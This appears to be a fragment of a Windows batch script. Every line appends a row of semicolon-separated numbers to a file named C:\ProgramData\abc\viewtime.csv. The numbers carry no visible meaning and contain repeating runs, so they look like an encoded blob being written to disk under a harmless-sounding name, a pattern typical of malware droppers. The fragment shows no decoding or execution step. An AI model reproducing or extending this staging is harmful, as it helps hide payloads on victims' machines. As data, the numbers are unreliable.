>> "C:\ProgramData\abc\viewtime.csv" echo(832.36;66.2;0841.30;0.884;209.75;0.4764;50.102;837.132;736.8;0543.42;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.60;184.913;5.0433;70.0;802.137;832.36;6034.510;2.60;0.884;219.0601;
>> "C:\ProgramData\abc\viewtime.csv" echo(35.0;50.102;837.132;7449.636;12.72;0.50;184.9894;931.5;30.0;802.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(0308.832;36.314;2.70;0.7639;884.243;75.0;60.102;0437.837;132.536;16.42;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.9079;70.184;951.5;70.0;0897.802;137.832;36.518;2.2191;50.0;884.7;
>> "C:\ProgramData\abc\viewtime.csv" echo(56.0;6990.70;102.837;132.536;20.5458;62.0;70.184;413.6;5929.40;0.802;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.832;36.4816;322.2;30.0;884.17;8916.76;0.40;102.837;132.0533;536.24;
>> "C:\ProgramData\abc\viewtime.csv" echo(32.0;60.184;7678.623;6.30;0.802;137.6504;832.36;526.2;50.0;6089.884;
>> "C:\ProgramData\abc\viewtime.csv" echo(31.46;0.40;102.5143;837.132;636.28;52.0;9338.50;184.735;6.50;0.5527;
>> "C:\ProgramData\abc\viewtime.csv" echo(802.137;832.36;730.2;8889.30;0.884;43.66;0.8237;50.102;837.132;436.32;
>> "C:\ProgramData\abc\viewtime.csv" echo(7528.32;0.50;184.547;6.4698;40.0;802.137;832.36;4751.634;2.50;0.884;
>> "C:\ProgramData\abc\viewtime.csv" echo(61.7781;66.0;30.102;837.132;6485.336;36.42;0.40;184.9619;365.6;70.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(802.137;8146.832;36.638;2.70;0.6324;884.71;76.0;60.102;0694.837;132.436;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.72;0.2412;40.184;673.6;30.0;8715.802;137.832;36.542;2.1241;70.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(884.77;36.0;1188.70;102.837;132.736;44.8573;42.0;70.184;583.6;3693.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.802;137.832;36.6655;746.2;30.0;884.85;3456.36;0.40;102.837;132.5593;
>> "C:\ProgramData\abc\viewtime.csv" echo(336.48;62.0;60.184;9407.491;6.50;0.802;137.7292;832.36;450.2;70.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(3270.884;101.66;0.70;102.7442;837.132;536.52;42.0;6967.50;184.821;6.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.2441;802.137;832.36;654.2;6286.70;0.884;127.56;0.1513;30.102;837.132;
>> "C:\ProgramData\abc\viewtime.csv" echo(336.56;7843.42;0.30;184.831;6.3627;60.0;802.137;832.36;7471.658;2.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.884;133.3410;66.0;60.102;837.132;1910.736;60.72;0.40;184.3083;857.6;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.0;802.137;9852.832;36.562;2.50;0.3424;884.161;46.0;30.102;3853.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(132.736;64.32;0.1484;40.184;863.6;50.0;9613.802;137.832;36.366;2.2504;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.0;884.173;36.0;9983.60;102.837;132.336;68.0510;52.0;70.184;885.6;
>> "C:\ProgramData\abc\viewtime.csv" echo(6210.50;0.802;137.832;36.4546;670.2;40.0;884.187;8058.66;0.70;102.837;
>> "C:\ProgramData\abc\viewtime.csv" echo(132.7978;736.72;42.0;30.184;6556.897;6.30;0.802;137.8965;832.36;774.2;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.0;6609.884;205.46;0.30;102.2377;837.132;336.76;72.0;0517.60;184.911;
>> "C:\ProgramData\abc\viewtime.csv" echo(6.50;0.2748;802.137;832.36;478.2;7741.60;0.884;217.76;0.6558;30.102;
>> "C:\ProgramData\abc\viewtime.csv" echo(837.132;736.80;3929.72;0.40;184.923;6.2471;40.0;802.137;832.36;4723.382;
>> "C:\ProgramData\abc\viewtime.csv" echo(2.70;0.884;241.0430;36.0;40.102;837.132;8972.336;84.62;0.30;184.3077;
>> "C:\ProgramData\abc\viewtime.csv" echo(947.6;30.0;802.137;7848.832;36.586;2.70;0.3022;884.251;56.0;50.102;
>> "C:\ProgramData\abc\viewtime.csv" echo(7870.837;132.436;88.62;0.9817;50.184;953.6;50.0;2597.802;137.832;36.590;
>> "C:\ProgramData\abc\viewtime.csv" echo(2.4183;70.0;884.9;77.0;9041.30;102.837;132.636;92.1311;62.0;50.184;
>> "C:\ProgramData\abc\viewtime.csv" echo(419.7;3880.50;0.802;137.832;36.4823;394.2;70.0;884.31;1816.57;0.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(102.837;132.1005;436.96;42.0;40.184;2816.739;7.70;0.802;137.5400;832.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(698.2;40.0;1888.884;55.47;0.70;102.2567;837.132;636.100;72.0;5729.70;
>> "C:\ProgramData\abc\viewtime.csv" echo(184.469;7.70;0.1777;802.137;832.36;802.2;4809.60;0.884;75.67;0.0018;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.102;837.132;736.104;9130.42;0.60;184.479;7.9079;60.0;802.137;832.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(6078.806;2.30;0.884;81.2996;37.0;30.102;837.132;8603.336;108.42;0.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(184.5144;685.7;60.0;802.137;7158.832;36.810;2.30;0.3041;884.87;77.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(60.102;1032.837;132.536;112.32;0.2755;30.184;697.7;70.0;6390.802;137.832;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.814;2.7962;30.0;884.109;37.0;8947.40;102.837;132.436;116.5563;62.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(30.184;815.7;7376.40;0.802;137.832;36.9978;818.2;70.0;884.121;4518.47;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.60;102.837;132.5000;436.120;52.0;50.184;8272.839;7.60;0.802;137.1339;
>> "C:\ProgramData\abc\viewtime.csv" echo(832.36;822.2;30.0;8791.884;141.67;0.50;102.6403;837.132;436.124;72.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(3343.50;184.857;7.30;0.4242;802.137;832.36;826.2;5616.50;0.884;159.47;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.6924;70.102;837.132;736.128;4988.42;0.30;184.881;7.2707;40.0;802.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(832.36;0436.830;2.60;0.884;187.8219;47.0;70.102;837.132;6745.536;132.32;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.40;184.4628;895.7;30.0;802.137;8728.832;36.834;2.40;0.7043;884.201;
>> "C:\ProgramData\abc\viewtime.csv" echo(57.0;30.102;7223.837;132.336;136.62;0.1436;50.184;905.7;30.0;0424.802;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.832;36.838;2.7707;70.0;884.207;47.0;1291.40;102.837;132.436;140.7129;
>> "C:\ProgramData\abc\viewtime.csv" echo(32.0;40.184;941.255;4081.30;0.802;137.768;36.8405;436.199;568.36;440.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(7698.60;0.60;235.410;139.1612;768.36;440.255;892.137;7218.668;36.740;139.832;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.2723;844.2;70.0;457.68;5610.436;40.815;93.472;99.3682;568.36;340.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.140;3067.536;176.52;0.70;15.9546;882.4;31.136;668.36;1695.332;15.883;
>> "C:\ProgramData\abc\viewtime.csv" echo(68.636;36.7558;515.190;476.36;632.72;6299.699;84.636;40.615;183.4417;384.84;
>> "C:\ProgramData\abc\viewtime.csv" echo(648.137;848.36;6169.848;2.60;0.668;139.6698;892.139;909.139;832.36;6869.848;
>> "C:\ProgramData\abc\viewtime.csv" echo(2.40;0.839;200.9145;932.221;41.0;60.139;6907.576;36.744;15.875;200.7736;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.193;415.183;776.36;0898.436;51.910;247.941;139.5614;894.137;368.36;444.235;
>> "C:\ProgramData\abc\viewtime.csv" echo(1973.840;139.668;36.744;72.4298;829.196;868.2;50.0;1628.895;204.904;204.904;
>> "C:\ProgramData\abc\viewtime.csv" echo(204.2795;904.204;472.137;376.36;1971.38;72.831;236.556;72.1573;839.76;736.64;
>> "C:\ProgramData\abc\viewtime.csv" echo(932.173;7749.54;0.60;255.900;137.7744;668.36;536.199;568.36;2552.632;0.30;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.40;235.1337;510.139;768.36;332.255;9535.892;137.468;36.632;139.3231;568.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(636.57;368.36;4210.732;115.670;72.699;68.4774;536.32;572.139;676.36;9422.764;
>> "C:\ProgramData\abc\viewtime.csv" echo(15.890;4.41;131.0428;948.65;824.49;772.99;4227.768;36.532;72.839;76.1875;
>> "C:\ProgramData\abc\viewtime.csv" echo(536.64;315.190;54.1;9019.831;248.390;127.630;72.4633;499.68;736.32;772.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(4982.776;36.464;15.890;4.9205;71.131;892.32;472.99;5842.776;36.332;72.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(84.6777;336.64;836.4;310.235;6431.866;72.831;196.756;195.5816;904.204;904.204;
>> "C:\ProgramData\abc\viewtime.csv" echo(904.204;5403.904;204.904;204.904;204.0356;904.204;837.84;336.16;6868.572;137.776;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.68;72.8978;831.236;556.72;839.76;3001.436;64.932;25.44;0.9046;40.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(668.36;432.139;4823.768;36.632;57.468;36.0527;372.125;614.72;599.68;2531.736;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.372;139.676;36.6143;564.198;44.1;50.72;4301.831;196.556;195.904;204.4607;
>> "C:\ProgramData\abc\viewtime.csv" echo(904.204;904.204;904.204;9471.476;137.668;36.424;72.0863;837.84;536.16;472.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(7215.476;36.48;72.831;236.1319;340.72;839.68;336.48;7177.772;137.74;36.472;
>> "C:\ProgramData\abc\viewtime.csv" echo(139.3394;468.36;356.72;837.68;0754.436;8.472;139.368;36.5188;464.72;837.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(336.16;2357.372;139.668;36.564;72.3240;955.200;572.137;468.36;3166.464;72.831;
>> "C:\ProgramData\abc\viewtime.csv" echo(124.336;16.1412;70.116;640.72;839.4;6509.436;72.839;76.436;8.7323;415.182;
>> "C:\ProgramData\abc\viewtime.csv" echo(59.136;48.72;6507.839;4.536;72.955;192.9582;572.137;74.36;572.139;1205.468;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.48;72.955;192.0434;772.137;468.36;38.235;0223.885;72.839;68.536;48.4214;
>> "C:\ProgramData\abc\viewtime.csv" echo(672.131;896.40;895.204;7680.904;204.904;204.904;204.7733;904.204;376.137;568.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(3787.524;137.484;36.716;72.8423;837.76;436.8;472.131;5685.936;24.472;139.568;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.4412;632.72;837.4;536.72;8556.839;68.736;48.772;137.7999;568.36;78.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.68;1208.636;48.372;255.900;72.0511;837.68;536.48;672.131;3853.824;36.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.818;24.7500;772.139;34.36;615.182;5817.376;36.740;136.78;72.8348;839.4;
>> "C:\ProgramData\abc\viewtime.csv" echo(436.72;955.192;0818.772;137.74;36.935;201.9201;372.139;668.36;732.72;8522.831;
>> "C:\ProgramData\abc\viewtime.csv" echo(196.724;195.904;204.7423;904.204;668.137;668.36;9549.324;137.584;36.716;137.7289;
>> "C:\ProgramData\abc\viewtime.csv" echo(676.36;78.72;831.236;1118.356;131.824;36.772;0.2236;817.9;884.1;30.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(5863.50;235.818;235.816;51.7267;910.139;468.36;472.185;0148.52;0.40;0.947;
>> "C:\ProgramData\abc\viewtime.csv" echo(241.5435;839.194;833.192;817.58;8131.351;210.839;68.536;72.2569;885.2;50.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.247;5690.941;137.568;36.432;139.0702;476.36;464.15;875.76;5644.636;64.351;
>> "C:\ProgramData\abc\viewtime.csv" echo(210.839;193.6822;947.116;336.80;839.194;1297.768;139.568;36.580;139.0590;676.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(632.139;909.139;4654.900;232.850;255.955;255.0588;935.41;935.39;839.68;0834.536;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.955;200.568;139.5211;468.36;780.139;908.139;9511.776;36.564;232.824;255.6812;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.255;839.76;536.64;0772.515;175.900;139.893;51.4922;910.247;816.36;480.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(3093.894;72.831;196.356;195.8564;904.204;904.204;904.204;1955.672;137.676;36.48;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.9014;831.236;340.184;41.0;6525.60;0.572;105.892;153.6420;56.0;40.72;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.76;3005.536;48.772;3.765;8.5822;472.139;908.72;839.76;2369.536;48.932;
>> "C:\ProgramData\abc\viewtime.csv" echo(133.32;0.3404;70.72;839.76;636.48;3365.932;187.917;255.955;144.6721;572.131;
>> "C:\ProgramData\abc\viewtime.csv" echo(896.40;895.204;6870.904;204.904;204.372;137.5149;476.36;58.87;772.129;6467.936;
>> "C:\ProgramData\abc\viewtime.csv" echo(96.71;0.50;184.4161;61.0;70.0;672.105;8404.892;206.76;0.70;72.5350;
>> "C:\ProgramData\abc\viewtime.csv" echo(839.140;536.112;71.0;8408.30;72.53;65.58;72.8484;839.208;372.139;840.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(3294.812;1.60;0.932;59.8718;32.0;50.72;841.5;2785.832;255.955;255.472;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.0451;368.36;740.199;468.36;3477.656;0.50;0.40;72.7141;841.68;336.80;
>> "C:\ProgramData\abc\viewtime.csv" echo(372.139;7606.948;51.892;185.54;1.3796;50.0;943.170;672.199;5350.668;36.448;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.50;0.1654;30.65;884.4;51.0;6797.70;72.841;84.536;80.6349;751.201;
>> "C:\ProgramData\abc\viewtime.csv" echo(772.139;832.36;6140.812;1.60;0.955;80.4937;804.199;468.36;432.4;1975.41;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.40;131.824;36.7742;532.0;826.29;472.99;7359.368;36.432;15.890;68.1219;
>> "C:\ProgramData\abc\viewtime.csv" echo(74.80;831.248;792.117;7455.62;235.612;139.468;36.1907;432.255;900.137;568.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(4327.432;235.920;72.839;68.5600;736.40;472.5;458.100;9278.50;0.672;137.568;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.2180;640.139;468.36;432.255;7472.892;72.852;72.841;68.4404;34.80;372.137;
>> "C:\ProgramData\abc\viewtime.csv" echo(468.36;8996.748;186.47;0.70;0.9893;572.139;776.36;348.232;0564.640;253.955;
>> "C:\ProgramData\abc\viewtime.csv" echo(255.472;139.6551;576.36;648.232;842.252;3012.955;255.772;139.476;36.0471;548.232;
>> "C:\ProgramData\abc\viewtime.csv" echo(912.236;955.255;6341.372;152.372;139.376;36.5470;640.72;743.200;672.139;9232.893;
>> "C:\ProgramData\abc\viewtime.csv" echo(72.837;68.536;40.3954;772.139;468.36;640.72;6374.837;68.736;64.772;139.5311;
>> "C:\ProgramData\abc\viewtime.csv" echo(840.36;812.1;60.0;0728.955;84.536;64.844;72.7139;829.196;496.1;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(2302.795;195.904;204.672;137.5647;584.36;616.72;837.76;4636.336;8.372;131.936;
>> "C:\ProgramData\abc\viewtime.csv" echo(88.1008;372.139;676.36;796.232;2870.884;0.30;0.837;68.9975;736.36;899.68;
>> "C:\ProgramData\abc\viewtime.csv" echo(336.48;9376.651;0.50;0.899;68.1655;636.52;677.0;40.0;4033.899;68.336;
>> "C:\ProgramData\abc\viewtime.csv" echo(56.788;0.9023;50.0;899.68;436.60;2105.801;0.70;0.899;68.5381;436.64;
>> "C:\ProgramData\abc\viewtime.csv" echo(755.0;40.0;6335.899;68.536;68.587;0.3448;50.0;899.68;536.72;7641.805;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.70;0.899;68.0632;636.76;457.0;70.0;6739.899;68.436;32.30;0.7025;
>> "C:\ProgramData\abc\viewtime.csv" echo(60.0;935.10;839.68;2130.536;32.955;192.837;68.0764;636.32;839.68;436.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(6815.657;68.336;32.815;58.9049;839.68;536.32;672.139;2384.576;36.696;15.890;
>> "C:\ProgramData\abc\viewtime.csv" echo(4.4271;61.137;668.36;640.51;8408.910;139.668;36.532;185.7932;38.0;40.0;
>> "C:\ProgramData\abc\viewtime.csv" echo(947.241;9349.839;194.839;192.839;76.0227;736.40;351.76;832.48;2513.839;193.839;
>> "C:\ProgramData\abc\viewtime.csv" echo(76.336;32.0916;672.139;584.36;804.136;6763.44;10.935;178.839;68.8995;436.36;
>> "C:\ProgramData\abc\viewtime.csv" echo(572.139;776.36;3879.804;198.54;1.40;184.2656;41.0;40.0;772.131;4961.896;
>> "C:\ProgramData\abc\viewtime.csv" echo(88.895;204.904;204.9777;904.204;372.137;676.36;3547.38;72.831;236.624;199.8132;
>> "C:\ProgramData\abc\viewtime.csv" echo(54.36;50.0;30.0;9800.839;4.536;72.839;76.9294;336.32;615.190;54.1;
>> "C:\ProgramData\abc\viewtime.csv" echo(3745.831;248.955;116.710;139.1378;54.36;955.192;837.4;7825.436;235.929;139.74;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.7925;672.131;896.24;895.204;3417.904;204.904;204.904;204.5017;904.204;904.204;
>> "C:\ProgramData\abc\viewtime.csv" echo(904.204;8765.672;137.576;36.38;72.8900;831.236;524.199;44.36;4618.70;0.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(0.935;8.5461;839.4;436.255;892.137;5980.44;36.772;99.44;36.2175;372.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(476.36;432.15;1818.890;4.61;133.892;117.7866;37.139;64.36;955.192;2167.935;
>> "C:\ProgramData\abc\viewtime.csv" echo(2.935;222.772;131.0143;896.24;895.204;904.204;1538.904;204.904;204.772;137.2004;
>> "C:\ProgramData\abc\viewtime.csv" echo(484.36;716.72;837.76;2588.736;8.376;137.668;36.7860;324.76;837.76;336.32;
>> "C:\ProgramData\abc\viewtime.csv" echo(0368.895;204.904;204.904;204.9913;904.204;904.204;904.204;9507.472;184.50;0.953;
>> "C:\ProgramData\abc\viewtime.csv" echo(255.8216;955.7;40.0;772.187;3974.800;105.815;111.814;100.2140;801.114;472.139;
>> "C:\ProgramData\abc\viewtime.csv" echo(78.72;1339.459;203.816;8.472;45.0314;30.16;70.0;935.240;8823.672;131.892;
>> "C:\ProgramData\abc\viewtime.csv" echo(8.576;139.6265;908.72;839.24;672.131;3143.951;2.827;100.372;199.5125;893.64;
>> "C:\ProgramData\abc\viewtime.csv" echo(70.0;40.72;9197.415;175.917;72.831;192.7742;48.72;43.195;676.139;9853.588;
>> "C:\ProgramData\abc\viewtime.csv" echo(8.773;131.951;0.2811;826.58;472.139;772.16;9315.573;131.951;1.826;48.6335;
>> "C:\ProgramData\abc\viewtime.csv" echo(472.139;580.24;573.131;1240.951;2.826;38.676;139.3985;664.32;773.131;951.3;
>> "C:\ProgramData\abc\viewtime.csv" echo(1782.826;28.676;139.672;40.7287;373.131;951.4;826.18;3020.576;139.488;48.576;
>> "C:\ProgramData\abc\viewtime.csv" echo(137.6827;592.36;640.76;839.88;3240.556;76.837;92.536;48.8809;677.139;626.73;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.195;6757.777;137.326;72.839;0.5881;955.224;372.199;892.0;5768.70;0.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(195.816;40.3171;344.40;688.51;728.85;0378.586;5.357;11.383;59.0599;412.120;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.127;734.57;0168.51;123.562;11.775;82.6361;763.33;436.255;825.57;4059.628;
>> "C:\ProgramData\abc\viewtime.csv" echo(9.591;255.824;35.6316;328.0;390.54;57.93;0626.812;34.754;11.801;56.8103;
>> "C:\ProgramData\abc\viewtime.csv" echo(628.77;686.5;561.9;9488.571;50.427;255.812;63.0091;361.4;767.50;647.80;
>> "C:\ProgramData\abc\viewtime.csv" echo(4190.595;40.525;255.812;33.0925;455.22;782.31;58.87;9159.487;33.361;255.801;
>> "C:\ProgramData\abc\viewtime.csv" echo(36.3951;642.17;766.54;55.127;2910.465;40.361;255.817;63.0050;761.0;823.62;
>> "C:\ProgramData\abc\viewtime.csv" echo(311.75;8346.682;63.433;255.816;40.4835;544.40;788.51;428.85;2793.486;11.749;
>> "C:\ProgramData\abc\viewtime.csv" echo(9.782;25.2676;78.84;786.12;955.101;9215.436;42.317;66.554;5.3680;805.65;
>> "C:\ProgramData\abc\viewtime.csv" echo(634.44;50.84;9048.435;255.826;44.740;51.5328;794.50;630.118;385.11;1004.649;
>> "C:\ProgramData\abc\viewtime.csv" echo(9.482;18.417;255.1919;812.63;761.4;767.50;2709.347;80.695;40.621;4.9261;
>> "C:\ProgramData\abc\viewtime.csv" echo(371.39;30.87;784.12;0350.955;96.540;44.735;94.8510;359.12;805.92;436.54;
>> "C:\ProgramData\abc\viewtime.csv" echo(6190.717;82.337;255.397;40.7995;357.1;813.62;55.92;2269.955;102.635;53.64;
>> "C:\ProgramData\abc\viewtime.csv" echo(71.6279;41.0;492.68;62.62;4978.435;94.459;12.955;97.1059;557.52;336.83;
>> "C:\ProgramData\abc\viewtime.csv" echo(551.47;5696.676;93.346;44.312;88.8117;657.61;388.81;333.61;8631.955;112.763;
>> "C:\ProgramData\abc\viewtime.csv" echo(61.44;67.4162;350.61;681.65;740.57;7655.41;71.356;6.785;100.1274;734.42;
>> "C:\ProgramData\abc\viewtime.csv" echo(614.255;496.56;6601.358;8.794;35.761;81.6931;765.40;457.1;571.56;5557.76;
>> "C:\ProgramData\abc\viewtime.csv" echo(85.800;34.442;14.2322;955.100;344.49;617.113;7772.656;27.809;91.363;61.3419;
>> "C:\ProgramData\abc\viewtime.csv" echo(34.83;439.6;586.95;2705.426;55.523;92.320;8.1716;685.95;447.57;36.92;
>> "C:\ProgramData\abc\viewtime.csv" echo(8684.436;255.812;33.555;22.4499;682.3;71.75;686.44;1760.660;21.788;56.55;
>> "C:\ProgramData\abc\viewtime.csv" echo(110.1084;792.63;551.255;801.36;7770.642;17.566;54.35;104.8858;570.40;742.28;
>> "C:\ProgramData\abc\viewtime.csv" echo(955.97;0528.457;52.445;86.436;1.4017;808.93;636.59;410.83;4746.550;58.377;
>> "C:\ProgramData\abc\viewtime.csv" echo(65.636;54.5262;32.255;697.57;352.55;3336.785;30.47;74.486;63.9655;444.43;
>> "C:\ProgramData\abc\viewtime.csv" echo(588.51;512.124;1181.675;255.812;44.440;17.4517;366.37;412.3;519.46;6574.755;
>> "C:\ProgramData\abc\viewtime.csv" echo(16.691;51.373;87.0826;392.57;820.3;794.57;7672.313;25.827;9.410;69.2113;
>> "C:\ProgramData\abc\viewtime.csv" echo(782.57;629.75;674.109;8329.662;10.769;119.311;88.4432;764.40;820.64;571.255;
>> "C:\ProgramData\abc\viewtime.csv" echo(6267.812;44.740;17.566;37.0447;412.3;419.5;457.22;2070.495;27.60;87.688;
>> "C:\ProgramData\abc\viewtime.csv" echo(62.7415;820.10;381.49;426.92;9054.371;112.804;29.418;47.0231;955.112;444.40;
>> "C:\ProgramData\abc\viewtime.csv" echo(717.66;5281.337;12.33;19.740;54.5032;717.69;546.84;628.67;1829.809;60.71;
>> "C:\ProgramData\abc\viewtime.csv" echo(86.348;84.2061;628.67;809.58;54.68;3042.450;84.728;67.809;11.0525;712.77;
>> "C:\ProgramData\abc\viewtime.csv" echo(750.38;595.122;9174.432;57.52;82.806;89.7808;465.22;453.255;824.59;1475.361;
>> "C:\ProgramData\abc\viewtime.csv" echo(23.564;37.60;77.9135;486.0;457.21;571.62;2699.57;94.619;62.544;4.7973;
>> "C:\ProgramData\abc\viewtime.csv" echo(769.35;712.93;955.80;8837.819;4.518;94.557;13.9087;686.68;462.4;322.78;
>> "C:\ProgramData\abc\viewtime.csv" echo(3706.436;29.492;94.826;106.7182;757.68;539.25;578.90;6810.635;55.57;25.551;
>> "C:\ProgramData\abc\viewtime.csv" echo(5.9741;585.79;646.98;557.64;7765.362;7.593;92.758;43.5662;457.68;746.26;
>> "C:\ProgramData\abc\viewtime.csv" echo(777.86;9360.332;107.787;107.336;25.7910;673.92;647.50;622.25;2339.351;5.785;
>> "C:\ProgramData\abc\viewtime.csv" echo(255.817;36.6146;454.1;823.54;427.94;9414.386;11.445;11.684;35.4539;70.86;
>> "C:\ProgramData\abc\viewtime.csv" echo(693.109;744.0;2276.468;35.60;87.484;109.1240;825.22;955.117;636.54;7521.71;
>> "C:\ProgramData\abc\viewtime.csv" echo(123.354;27.394;86.3173;511.45;311.84;335.0;0682.486;93.809;43.316;84.5420;
>> "C:\ProgramData\abc\viewtime.csv" echo(552.12;674.64;819.120;0256.664;68.819;59.811;114.3869;812.104;729.18;347.255;
>> "C:\ProgramData\abc\viewtime.csv" echo(7156.596;36.534;0.410;114.7154;628.25;803.40;632.17;5488.800;50.610;77.790;
>> "C:\ProgramData\abc\viewtime.csv" echo(34.2667;554.88;618.39;955.127;8327.334;55.621;97.67;73.2067;807.100;809.60;
>> "C:\ProgramData\abc\viewtime.csv" echo(710.89;5788.750;255.694;40.453;6.2149;771.46;773.93;692.35;5399.361;255.827;
>> "C:\ProgramData\abc\viewtime.csv" echo(34.355;21.2735;797.7;373.107;807.109;5933.560;10.489;50.773;20.2812;319.46;
>> "C:\ProgramData\abc\viewtime.csv" echo(557.9;491.62;0319.67;94.719;63.745;11.4650;955.65;356.54;769.69;6111.650;
>> "C:\ProgramData\abc\viewtime.csv" echo(29.576;65.435;61.5850;41.255;817.36;354.1;3064.823;54.427;94.386;11.9058;
>> "C:\ProgramData\abc\viewtime.csv" echo(645.11;384.35;50.86;6501.393;109.762;4.394;59.2309;412.93;718.255;824.59;
>> "C:\ProgramData\abc\viewtime.csv" echo(4361.761;23.764;37.60;77.9046;386.0;657.21;471.62;6918.67;94.79;109.354;
>> "C:\ProgramData\abc\viewtime.csv" echo(10.2956;523.36;428.80;371.44;8880.558;9.682;119.545;117.6456;827.109;362.10;
>> "C:\ProgramData\abc\viewtime.csv" echo(666.57;4319.713;255.697;57.452;36.3199;683.51;747.76;793.46;8656.444;12.388;
>> "C:\ProgramData\abc\viewtime.csv" echo(57.661;88.4507;581.33;561.69;789.34;9293.64;91.586;63.820;10.2091;481.119;
>> "C:\ProgramData\abc\viewtime.csv" echo(715.76;593.46;6401.644;12.788;57.326;3.8927;619.104;745.69;486.51;4384.313;
>> "C:\ProgramData\abc\viewtime.csv" echo(75.786;62.643;95.2476;323.114;725.255;797.57;0305.452;36.383;51.747;76.6359;
>> "C:\ProgramData\abc\viewtime.csv" echo(493.46;444.12;388.57;8722.561;88.581;33.361;69.5129;820.28;955.122;435.43;
>> "C:\ProgramData\abc\viewtime.csv" echo(4937.70;69.635;32.687;71.9049;534.16;74.68;463.61;0452.588;81.533;61.395;
>> "C:\ProgramData\abc\viewtime.csv" echo(23.9121;727.13;675.67;55.57;4393.622;95.63;8.491;95.6373;740.120;411.88;
>> "C:\ProgramData\abc\viewtime.csv" echo(435.73;8525.675;86.762;55.49;65.0845;550.13;955.122;535.43;8678.40;69.335;
>> "C:\ProgramData\abc\viewtime.csv" echo(32.787;71.1476;634.16;44.68;763.61;4344.788;81.333;61.795;23.6002;731.8;
>> "C:\ProgramData\abc\viewtime.csv" echo(574.91;31.49;3708.311;92.636;73.486;85.1842;543.43;70.67;819.28;1177.387;
>> "C:\ProgramData\abc\viewtime.csv" echo(88.535;55.418;89.7869;955.122;335.43;30.69;6288.735;32.387;71.334;16.2525;
>> "C:\ProgramData\abc\viewtime.csv" echo(64.68;663.61;788.81;6848.533;61.495;23.55;29.0423;385.123;544.43;713.98;
>> "C:\ProgramData\abc\viewtime.csv" echo(0221.457;0.790;92.441;61.9283;754.67;337.0;387.84;8348.809;62.34;94.759;
>> "C:\ProgramData\abc\viewtime.csv" echo(12.8250;793.19;825.32;564.91;0489.547;255.822;35.743;0.6151;469.35;432.87;
>> "C:\ProgramData\abc\viewtime.csv" echo(471.34;2675.316;4.768;63.761;88.6028;481.33;461.95;423.53;3682.428;90.388;
>> "C:\ProgramData\abc\viewtime.csv" echo(40.744;62.0926;718.51;452.25;391.44;0246.643;13.310;103.717;28.2584;53.117;
>> "C:\ProgramData\abc\viewtime.csv" echo(432.69;827.54;1443.526;81.827;36.554;14.5169;568.106;476.73;955.122;8801.335;
>> "C:\ProgramData\abc\viewtime.csv" echo(43.30;69.735;32.1532;787.71;634.26;54.68;3073.550;40.693;87.363;61.6893;
>> "C:\ProgramData\abc\viewtime.csv" echo(722.68;330.7;393.86;5194.553;98.369;123.751;27.9219;373.126;634.60;416.91;
>> "C:\ProgramData\abc\viewtime.csv" echo(1124.750;43.688;64.440;25.4941;61.83;437.12;774.64;3069.54;54.41;82.447;
